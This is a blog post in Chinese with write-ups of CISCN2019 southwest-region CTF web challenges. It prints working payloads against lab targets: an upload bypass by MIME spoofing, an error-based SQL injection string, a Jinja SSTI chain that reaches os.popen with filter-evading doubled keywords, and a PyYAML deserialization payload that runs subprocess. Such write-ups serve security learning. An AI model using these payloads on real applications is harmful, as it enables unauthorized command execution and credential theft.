<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> CISCN2019-西南赛区部分Web题解 · Patrilic's blog</title><meta name="description" content="CISCN2019-西南赛区部分Web题解 - Patrilic"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/Avatar.jpg"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://patrilic.top/atom.xml" title="Patrilic's blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/Online_Tools" target="_self" class="nav-list-link">ONLINE_TOOLS</a></li><li class="nav-list-item"><a href="/Friends" target="_self" class="nav-list-link">FRIENDS</a></li><li class="nav-list-item"><a href="/2019/04/01/Hello/" target="_self" class="nav-list-link">ABOUT</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">CISCN2019-西南赛区部分Web题解</h1><div class="post-info">Jun 10, 2019</div><div class="post-content"><p>P1g3战队<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/931F982B33E8B1040822716BDAFA42EE.jpg" alt="931f982b33e8b1040822716bdafa42ee"></p>
<h2 id="Ciscn-q07"><a href="#Ciscn-q07" class="headerlink" title="Ciscn-q07"></a>Ciscn-q07</h2><p>先注册一个admin’# 的账号然后直接文件上传<br>直接传php(不用&lt;?php)<br>改mime为image/jpeg就getshell了..<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/071.png" alt="4d80f49d47825ccd9aca1330a124636c"><br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/072.png" alt="913690845a8e92d1ab10a77737894477"></p>
<p>判定了一个admin的权限</p>
<h2 id="Ciscn-q09"><a href="#Ciscn-q09" class="headerlink" title="Ciscn-q09"></a>Ciscn-q09</h2><p>注册用户登陆的时候，发现存在sql注入<br>登陆进去之后发现注释有提示，存在admin的账号，注册一个用户名为下面的账号，登陆即可注入admin的密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&apos;&amp;amp;&amp;amp; extractvalue(1,concat(0x7e,(select `3` from (select 1,2,3 union select * from user)a limit 1,1)))#</span><br></pre></td></tr></table></figure></p>
<p><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/091.png" alt="19cd6150c405f77f4e70098b9a9ff4f7"><br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/092.png" alt="f94276c29af45e7fc2928bcbe9248541"><br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/093.png" alt="86a8390a6baa79d4ccaa682ae02d91cb"></p>
<p>用admin的账号和密码登陆提示orange的SSRF，可控url就是bug反馈</p>
<p>携带cookie去请求flag.php即可获得flag<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/094.png" alt="9142fc4e44be8a5d61cde6519fdbf26e"></p>
<h2 id="Ciscn-8"><a href="#Ciscn-8" class="headerlink" title="Ciscn 8"></a>Ciscn 8</h2><p>URL：172.16.9.18<br>看着有计算功能，并且是PY，直接想SSTI，试了下 2<br>得到输出结果为2，确定了SSTI<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/123.png" alt="3a65fa54c411da804acc98652f208834"></p>
<p>然后就是用payload了，不过测试过程中发现了两个过滤的点 一个是括号，一个是open字符串，不过都可以用双写来绕过 括号只是单独的括号就会被置换为空，如果里面有字符的话就不会置换为空 比如 () 要用 (()) 绕， open 要用 opopenen 绕<br>于是最终的payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__.__getitem__(1).__subclasses__(())[302].__init__.__globals__[&apos;poopenpen&apos;](&apos;cat flag&apos;).read(())&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/111.png" alt="4ef955d4f8a6198ac47c9f39365b480c"><br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/112.png" alt="65c4176a3f67c25b3beafaad2432027a"></p>
<h2 id="Ciscn-10"><a href="#Ciscn-10" class="headerlink" title="Ciscn 10"></a>Ciscn 10</h2><p>URL： 172.16.9.20<br>点击忘记密码<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/3.png" alt="454b911c60722c999e150395e4fbcbab"></p>
<p>修改后可直接登录admin<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/图片 2.png" alt="5ce1c580d29d7c882b2e34f59ff2885f"></p>
<p>猜测yaml命令执行<br>执行ls结果<br> Payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!!map &#123;</span><br><span class="line">? !!str &quot;goodbye&quot;</span><br><span class="line">: !!python/object/apply:subprocess.check_output [</span><br><span class="line">!!str &quot;ls&quot;,],&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/图片 1.png" alt="1349a5aa45787c9df811b7ae787084f4"></p>
<p>准备构造payload 进行cat /flag时发现别人上传了5.yml<br>直接访问即可：<br> flag{81595b84-317b-434a-b45f-6aea2c37722c}</p>
</div></article></div></main><footer><div class="paginator"><a href="/2019/06/05/QWB2019 Web -随便注（题解）/" class="next">NEXT</a></div><div class="copyright"><p>© 2019 <a href="http://patrilic.top">Patrilic</a>, powered by Apoll.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"tagMode":false});</script></body></html>